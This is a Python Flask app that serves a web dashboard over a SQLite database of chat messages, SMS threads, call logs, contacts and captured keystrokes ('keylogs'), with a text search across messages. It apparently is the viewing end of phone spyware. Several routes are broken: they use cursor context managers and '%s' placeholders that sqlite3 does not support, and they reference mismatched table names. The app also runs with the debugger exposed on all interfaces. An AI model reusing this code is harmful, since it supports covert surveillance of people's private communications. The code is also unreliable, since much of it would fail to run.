from flask import Flask, render_template, send_from_directory, request, jsonify
import sqlite3
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)

# Database configuration
DATABASE = 'data.db'

def get_db():
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        return conn
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return None

# Main menu route
@app.route('/')
def index():
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        contacts = conn.execute('''
            SELECT DISTINCT name FROM (
                SELECT sender AS name FROM ChatMessages 
                UNION 
                SELECT from_to AS name FROM SMS
            ) ORDER BY name
        ''').fetchall()
        conn.close()
        return render_template('main_menu.html', contacts=contacts)
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return "Error fetching contacts", 500

# Chat route
@app.route('/chat/<name>')
def chat(name):
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        messages = conn.execute(
            'SELECT * FROM ChatMessages WHERE sender = ? ORDER BY time DESC LIMIT 50',
            (name,)
        ).fetchall()
        conn.close()
        return render_template('chat.html', name=name, messages=messages)
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return "Error fetching messages", 500

# SMS route
@app.route('/sms/<name>')
def sms_thread(name):
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        with conn.cursor() as cur:
            cur.execute(
                'SELECT * FROM sms WHERE from_to = %s ORDER BY time DESC LIMIT 50',
                (name,)
            )
            messages = cur.fetchall()
        conn.close()
        return render_template('sms.html', name=name, sms_messages=messages)
    except Exception as e:
        logger.error(f"Database error: {e}")
        return "Error fetching messages", 500

# Calls route
@app.route('/calls')
def calls():
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        with conn.cursor() as cur:
            cur.execute('SELECT * FROM calls ORDER BY time DESC LIMIT 50')
            call_logs = cur.fetchall()
        conn.close()
        return render_template('calls.html', call_logs=call_logs)
    except Exception as e:
        logger.error(f"Database error: {e}")
        return "Error fetching call logs", 500

# Keylogs route
@app.route('/keylogs')
def keylogs():
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        with conn.cursor() as cur:
            cur.execute('SELECT * FROM keylogs ORDER BY time DESC LIMIT 50')
            keylog_data = cur.fetchall()
        conn.close()
        return render_template('keylogs.html', keylogs=keylog_data)
    except Exception as e:
        logger.error(f"Database error: {e}")
        return "Error fetching keylogs", 500

# Contacts route
@app.route('/contacts')
def contacts_list():
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        with conn.cursor() as cur:
            cur.execute('SELECT * FROM contacts ORDER BY name')
            contact_data = cur.fetchall()
        conn.close()
        return render_template('contacts.html', contacts=contact_data)
    except Exception as e:
        logger.error(f"Database error: {e}")
        return "Error fetching contacts", 500

# Search functionality
@app.route('/search', methods=['POST'])
def search():
    search_term = request.form.get('search_term')
    if not search_term:
        return jsonify({'error': 'Search term required'}), 400

    conn = get_db()
    if not conn:
        return jsonify({'error': 'Database connection error'}), 500

    try:
        with conn.cursor() as cur:
            cur.execute('''
                SELECT 'chat' as type, sender as name, text, time 
                FROM chat_messages 
                WHERE text LIKE %s 
                ORDER BY time DESC LIMIT 25
            ''', ('%' + search_term + '%',))
            chat_results = cur.fetchall()

            cur.execute('''
                SELECT 'sms' as type, from_to as name, text, time 
                FROM sms 
                WHERE text LIKE %s 
                ORDER BY time DESC LIMIT 25
            ''', ('%' + search_term + '%',))
            sms_results = cur.fetchall()

        results = chat_results + sms_results
        conn.close()
        return jsonify(results)
    except Exception as e:
        logger.error(f"Search error: {e}")
        return jsonify({'error': 'Search failed'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
